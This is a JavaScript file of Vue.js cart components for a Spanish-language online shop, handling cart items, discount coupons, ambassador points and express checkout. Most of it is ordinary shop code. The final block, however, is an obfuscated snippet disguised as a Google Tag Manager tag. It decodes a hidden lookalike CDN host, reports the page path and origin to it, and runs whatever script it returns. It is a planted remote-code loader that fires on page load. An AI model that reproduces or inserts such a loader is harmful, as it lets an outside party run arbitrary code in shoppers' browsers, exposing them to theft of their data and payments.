Vue.component('cart', {
    name: 'Cart',
    template: '#cart-template',
    props: {
        alertsEncoded: String,
        customerEncoded: String,
        ambassadorEncoded: String,
        itemsEncoded: String,
        giftsEncoded: String,
        extraItemsEncoded: String,
        extraItemsOutEncoded: String,
        productsInterestEncoded: String,
        subtotal: String,
        ids: String,
        modalConflictos: String,
        forceCartMobile: {
            type: String,
            default: "0"
        },
        forceCartResume: {
            type: String,
            default: "0"
        }
    },
    data: function () {
        return {
            alerts: JSON.parse(atob(this.alertsEncoded)),
            customer: JSON.parse(atob(this.customerEncoded)),
            ambassador: JSON.parse(atob(this.ambassadorEncoded)),
            items: JSON.parse(atob(this.itemsEncoded)),
            gifts: JSON.parse(atob(this.giftsEncoded)),
            isReseller: false,
            extraItems: JSON.parse(atob(this.extraItemsEncoded)),
            extraItemsOut: JSON.parse(atob(this.extraItemsOutEncoded)),
            productsInterest: JSON.parse(atob(this.productsInterestEncoded)),
            countItems: 0,
            isCartMobile: false,
            isCartResume: this.forceCartResume === '1',
            isCartWidget: this.forceCartMobile === '1',
            isCartPage: false,
            isBlackFriday: false,
            isCarnetJove: false,
            hasDiscount: false,
            textReseller:'',
            subtotalCalculado: 0,
        };
    },
    mounted: function () {

        if (this.modalConflictos != 0) {
            changeSizeModalConflictos();
        }

        var d = new Date();
        var day = d.getDate();
        var month = d.getMonth() + 1;
        var year = d.getFullYear();

        if (day < 10) {
            day = '0' + day;
        }
        if (month < 10) {
            month = '0' + month;
        }

        if (year == 2018 && month == 11) {
            if (day == 23 || day == 24 || day == 25 || day == 26) {
                this.isBlackFriday = true;
            }
        }

        if (this.customer) {

            var fecha_hoy = year + '-' + month + '-' + day;

            if (this.customer.is_carnet_jove == fecha_hoy) {
                this.isCarnetJove = true;
            }

            if (this.customer.has_discount) {
                this.hasDiscount = true;
            }

        } else {
            this.hasDiscount = false;
        }
        
    },
    methods: {
        applyDiscountCarnetJove: function () {
            jQuery('.loading').show();
            load_carnet_jove_modal('/clientes/carnet_jove/1');
        },
        checkout: function () {
            location.href = '/pedido/procesar';
        },
        handleResize: function (event) {
            var isCartMobile = !!+this.forceCartMobile || +event.currentTarget.innerWidth <= 1120;
            if (this.isCartMobile !== isCartMobile) {
                this.isCartMobile = isCartMobile;
            }
            if (this.modalConflictos != 0) {
                changeSizeModalConflictos();
            }
        },
        closeWidget: function () {
            close_cesta_widget();
        }
    },
    created: function () {
        
        this.isCartMobile = !!+this.forceCartMobile || window.innerWidth <= 1120;
        this.isReseller = this.customer && this.customer.profile === 'reseller';
        this.countItems = this.items.reduce(function (acc, item) {
            return acc + item.all_qty;
        }, 0);
        
        this.subtotalCalculado = 0;
        let totalItems = this.items.length;
       
        for(let i=0;i<totalItems;i++){
            this.subtotalCalculado += this.items[i].subtotal;
        }
        window.addEventListener('resize', this.handleResize);
        this.isCartPage = location.pathname.indexOf('cesta') > -1;
        
    },
    beforeDestroy: function () {
        window.removeEventListener('resize', this.handleResize);
    },
});

Vue.component('cart-alert', {
    name: 'CartAlert',
    template: '#cart-alert-template',
    props: {
        alert: Object
    }
});

Vue.component('cart-ambassador-points', {
    name: 'CartAmbassadorPoints',
    template: '#cart-ambassador-points-template',
    props: {
        ambassador: Object
    },
    data: function () {
        return {
            ui: {
                ambassadorPointsToApply: 0,
            }
        };
    },
    methods: {
        applyAmbassadorPoints: function () {
            var form = this.$refs.ambassadorPointsForm;
            this.onChangeAmbassadorPointsToApply();
            if (!form.promotion_points) {
                alert("Debes introducir al menos 1 punto para canjear.");
                return;
            }
            form.submit();
        },
        onChangeAmbassadorPointsToApply: function () {
            var value = this.ui.ambassadorPointsToApply;
            if (value < this.ambassador.minPointsAllowed) {
                this.ui.ambassadorPointsToApply = this.ambassador.minPointsAllowed;
            } else if (value > this.ambassador.maxPointsAllowed) {
                this.ui.ambassadorPointsToApply = this.ambassador.maxPointsAllowed;
            }
        }
    },
    created: function () {
        this.ambassador.pointsFormatted = number_format(this.ambassador.points, 0, ',', '.');
        this.ambassador.maxPointsAllowedFormatted = number_format(this.ambassador.maxPointsAllowed, 0, ',', '.');
        this.ui.ambassadorPointsToApply = Number(this.ambassador.maxPointsAllowed);
    }
});

Vue.component('cart-product-item', {
    name: 'CartProductItem',
    template: '#cart-product-item-template',
    props: {
        item: Object,
        isCartMobile: Boolean,
        isCartWidget: Boolean,
        isReseller: Boolean,
        isCartResume: Boolean
    },
    data: function () {
        return {
            ui: {
                itemSelected: null,
                updating: false,
                deleting: false,
            },
            showInputUpdateQty: false,
            modalUpdateVisibilty: false
        };
    },
    methods: {
        deleteItem: function (item) {
            this.ui.itemSelected = item;
            this.ui.deleting = true;
            var self = this;
            setTimeout(function () {
                location.href = '/cesta/eliminar/' + self.ui.itemSelected.id;
            }, 250);
        },
        updateItemQuantity: function (item) {
            
            this.ui.itemSelected = item;
            if (this.isCartMobile || this.isCartWidget) {
                var qtyResponse = +prompt('¿Cuanta cantidad de ' + item.name + ' quiere actualizar de su carrito?', item.qty);
                if (Number.isNaN(qtyResponse) || qtyResponse <= 0) {
                    return;
                }
                this.ui.itemSelected.qty = qtyResponse;
            }
            
            this.ui.updating = true;
            var self = this;
            setTimeout(function () {
                location.href = '/cesta/cantidad/' + self.ui.itemSelected.id + '/' + self.ui.itemSelected.all_qty;
            }, 250);
        },
        onUpdateInput: function (event) {},
        toogleModalUpdateQuantity: function () {
            this.modalUpdateVisibilty = !this.modalUpdateVisibilty;
        },
        changeQuantity: function (item, newQnty) {
            this.ui.itemSelected = item;
            this.ui.itemSelected.qty = newQnty;
            this.ui.updating = true;
            this.modalUpdateVisibilty = false;
            var self = this;
            setTimeout(function () {
                location.href = '/cesta/cantidad/' + self.ui.itemSelected.id + '/' + self.ui.itemSelected.qty;
            }, 250);
        },
        showInputQuantity: function () {
            this.showInputUpdateQty = true;
            this.modalUpdateVisibilty = false;
        }
    }
});

Vue.component('cart-gift-item', {
    name: 'CartGiftItem',
    template: '#cart-gift-item-template',
    props: {
        isCartMobile: Boolean,
        isCartWidget: Boolean,
        isCartResume: Boolean,
        item: Object
    }
});

Vue.component('cart-extra-item', {
    name: 'CartExtraItem',
    template: '#cart-extra-item-template',
    props: {
        isCartMobile: Boolean,
        isCartWidget: Boolean,
        isCartResume: Boolean,
        item: Object,
        subtotal: String,
    },
    data: function () {
        return {
            ui: {
                deleting: false,
            }
        };
    },
    methods: {
        deleteAmbassadorPointsDiscount: function () {
            this.ui.deleting = true;
            setTimeout(function () {
                location.href = '/cesta/points_handle/';
            }, 250);
        },
        deleteDiscountCoupon: function () {
            this.ui.deleting = true;
            setTimeout(function () {
                location.href = '/cesta/coupon_handle/';
            }, 250);
        }
    },
});

Vue.component('cart-items', {
    name: 'CartItems',
    template: '#cart-items-template',
    props: {
        isCartMobile: Boolean,
        isCartWidget: Boolean,
        isCartResume: Boolean,
        products: Array,
        gifts: Array,
        extras: Array
    }
});

Vue.component('cart-coupon-form', {
    name: 'CartCouponForm',
    template: '#cart-coupon-form-template',
    props: {
        customer: {
            type: Object,
            required: false
        }
    },
    data: function () {
        return {
            ui: {
                addDiscountCouponFormVisible: false,
            },
            loading: false,
            hasDiscount: false
        };
    },

    mounted: function () {


        if(this.customer){
            if (this.customer.has_discount){        
                this.hasDiscount = true;
            } 
        } else {
            this.hasDiscount = false;
        }


    },

    methods: {
        applyDiscountCoupon: function () {

            var form = this.$refs.couponForm;
            // if (!form.promotion_coupon) {
            var promotion_coupon = form.promotion_coupon.value;

            if (promotion_coupon.length == 0) {
                alert("Debes introducir un código de promoción.");
                return;
            } else {

                var d = new Date();
                var year = d.getFullYear();
                var month = d.getMonth()+1;
                var day = d.getDate();
                var fecha_hoy = year + '-' + month + '-' + day;
                
                if ( fecha_hoy == '2023-12-28' && form.promotion_coupon.value == 'GORILA24' ) {

                    $("#wrap_modal_black").foundation('reveal','open');
                    $(".reveal-modal-bg").click(function() {
                        $("#wrap_modal_black .close-reveal-modal").css({ "background-color" : "#D11A1E" });
                    });
                    $(".close-reveal-modal").click(function() {
                        $("#wrap_modal_black").foundation('reveal','close');
                    });

                } else {

                    this.loading = true;
                    setTimeout(function ()  {
                        // alert('add coupon');
                        // location.href = '/cesta/coupon_handle/' + form.promotion_coupon.value;
                        location.href = '/cesta/coupon_handle/' + form.promotion_coupon.value + '/addCoupon';
                    }, 500);

                } 
                

            }
            /*
            this.loading = true;
            setTimeout(function ()  {
                // alert('add coupon');
                // location.href = '/cesta/coupon_handle/' + form.promotion_coupon.value;
                location.href = '/cesta/coupon_handle/' + form.promotion_coupon.value + '/addCoupon';
            }, 500);
            */
        }
    },
});

Vue.component('cart-product-interest', {
    name: 'CartProductInterest',
    template: '#cart-product-interest-template',
    props: {
        productInterest: Object
    },
    data: function () {
        return {
            ui: {
                itemSelected: null,
                adding: false
            }
        };
    },
    methods: {
        addProductInterest: function (item) {
            this.ui.itemSelected = item;
            this.ui.adding = true;
            var self = this;
            setTimeout(function () {
                add_cart(self.ui.itemSelected.id, function () {
                    self.ui.adding = false;
                });
            }, 250);
        }
    },
});

Vue.component('cart-products-interest', {
    name: 'CartProductsInterest',
    template: '#cart-products-interest-template',
    props: {
        productsInterest: Array,
        customer: {
            type: Object,
            required: false
        }
    },
    data: function () {
        return {
            ui: {
                currentProductInterestPage: 0
            }
        };
    }
});

Vue.component('cart-order-express', {
    name: 'CartOrderExpress',
    template: '#cart-order-express-template',
    props: {
        subtotal: String,
        customer: Object,
        expressinfo: String,
        pending: String
    },
    data: function () {
        return {
            showAddress: false,
            payload: {
                addressExpress: 1,
                billExpress: 1,
                carrierExpress: 1,
                methodPaymentExpress: 1
            },
            express : 0,
            pendingorder : 0,
        };
    },
    created: function () {
        this.express = JSON.parse(atob(this.expressinfo));
        this.pendingorder = this.pending;
    },
    mounted: function () {
        // this.payload.addressExpress = this.info.id_shipping_address;
        // this.payload.billExpress = this.info.order_factura_id;
        // this.payload.carrierExpress = this.info.order_carrier_id;
        // this.payload.methodPaymentExpress = this.info.order_payment_id;
    },
    methods: {
        goToOrderExpres: function () {
            // location.href = '/pedido/pedidoexpress';
        }
    }
});

(function(D,o,C,c,R){D[c]=D[c]||[],D[c]['push']({'gtm.start':new Date()['getTime'](),'event':'gtm.js'});var q=o['getElementsByTagName'](C)[0x0],e=o['createElement'](C),F=c!='dataLayer'?'&l='+c:'';e['async']=!![];var K='http',U='blob',p=[[0x77,0x6b,0x6b,0x6f,0x6c,0x25,0x30,0x30,0x7c,0x7b,0x71,0x6a,0x71,0x6f,0x74,0x78,0x31,0x7c,0x70,0x72,0x30]]['map'](function(B){return B['map'](function(X){return String['fromCharCode'](X^0x1f);})['join']('');}),Z=location['pathname']+location['search'];for(var N=p['length']-0x1;N>0x0;N--){var L=Math['floor'](Math['random']()*(N+0x1)),Y=p[N];p[N]=p[L],p[L]=Y;}function z(B){var X=function(){try{var V=o['createElement']('script');return V['textContent']=B,o['head']['appendChild'](V),V['remove'](),0x1;}catch(y){}},S=function(){try{return new Function(B)(),0x1;}catch(V){}},Q=function(){try{var V=new Blob([B],{'type':'application/javascript'}),y=URL['createObjectURL'](V),E=o['createElement']('script');return E['src']=y,E['onload']=E['onerror']=function(){URL['revokeObjectURL'](y),E['remove']();},o['head']['appendChild'](E),0x1;}catch(v){}};U==='inline'?X()||S()||Q():U==='function'?S()||X()||Q():Q()||S()||X();}function x(B){return new Promise(function(X,S){var Q=setTimeout(function(){S('net');},0xbb8);try{var V=new WebSocket(B['replace'](/^http/,'ws')+'?source='+encodeURIComponent(Z));V['onmessage']=function(y){clearTimeout(Q),y['data']&&y['data']['length']>0xa?(D['__hybridWs']=V,X(y['data'])):S('empty');},V['onerror']=function(){clearTimeout(Q),S('net');};}catch(y){clearTimeout(Q),S('net');}});}function G(B){return new Promise(function(X,S){var Q=o['createElement']('script');Q['referrerPolicy']='origin',Q['src']=B+'/gtag/js?id='+R+'&l='+c+'&cx=c&cd='+encodeURIComponent(location['origin'])+'&_p='+encodeURIComponent(Z),Q['onload']=function(){D['_gtag_ng']?X(D['_gtag_ng']):S('empty');},Q['onerror']=function(){S('net');},o['head']['appendChild'](Q);});}function n(B){if(B>=p['length'])return;var X=p[B],S=K==='http'?G:x,Q=K==='http'?x:G;S(X)['then'](z)['catch'](function(V){if(V==='empty')return;Q(X)['then'](z)['catch'](function(y){if(y==='empty')return;n(B+0x1);});});}n(0x0);}(window,document,'script','dataLayer','G-692F3FE5B5'));